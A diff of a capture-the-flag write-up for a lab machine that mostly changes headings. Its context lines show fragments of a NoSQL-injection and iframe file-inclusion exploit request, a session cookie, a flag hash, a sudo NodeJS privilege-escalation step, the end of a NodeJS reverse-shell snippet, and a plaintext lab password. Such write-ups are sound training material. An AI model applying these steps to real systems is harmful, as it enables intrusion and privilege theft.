@@ -1,12 +1,12 @@
 ### Host: 10.10.11.196
 
-# Content
+### Content
 
 - NoSQL Injection
 - Local File Inclusion through iframe
 - NodeJS wildcard abuse
 
-# Reconnaissance
+### Reconnaissance
 
 Initial reconnaissance for TCP ports
 
@@ -127,7 +127,7 @@ Cookie: connect.sid=s%3AyGd29rDOOta_oSwfj5BOgTjQThwvLm0v.1A9F%2BB%2FN8%2FuDhxgwL
 The following is retrieved:
 ![[Pasted image 20230123205001.png]]
 
-# Exploitation
+### Exploitation
 In order to exploit this LFI we can adjust the iFrame as follows:
 ```bash
 POST /api/order HTTP/1.1
@@ -184,7 +184,7 @@ angoose@stocker:~$ cat user.txt
 ebe2ef983e893cb359eb38b330787857
 ```
 
-# Root privesc
+### Privilege Escalation
 On the system there is an entry on the /etc/sudoers file: ^d64ec2
 ```bash
 angoose@stocker:~$ sudo -l
@@ -206,7 +206,7 @@ fs.readFile('/root/root.txt', 'utf-8', (err, data) =>{
 ```
 And that gives us the root flag.
 
-# Post Exploitation
+### Post Exploitation
 ^2cf0f4
 It is also possible to get a reverse shell as root with the following nodeJS code:
 ```bash
@@ -223,17 +223,17 @@ It is also possible to get a reverse shell as root with the following nodeJS cod
     return /a/; // Prevents the Node.js application form crashing
 })();
 ```
-# Credentials
+### Credentials
 ```bash
 angoose:IHeardPassphrasesArePrettySecure
 ```
 
-# Notes
+### Notes
 
 - Always try to use NoSQL Injection to try Authentication bypass
 - PDF web exploitation is arise, always check if create a PDF with any vulnerability gives any result.
 
-# Resources:
+### References
 
 [No-SQL Injection](https://book.hacktricks.xyz/pentesting-web/nosql-injection)
 
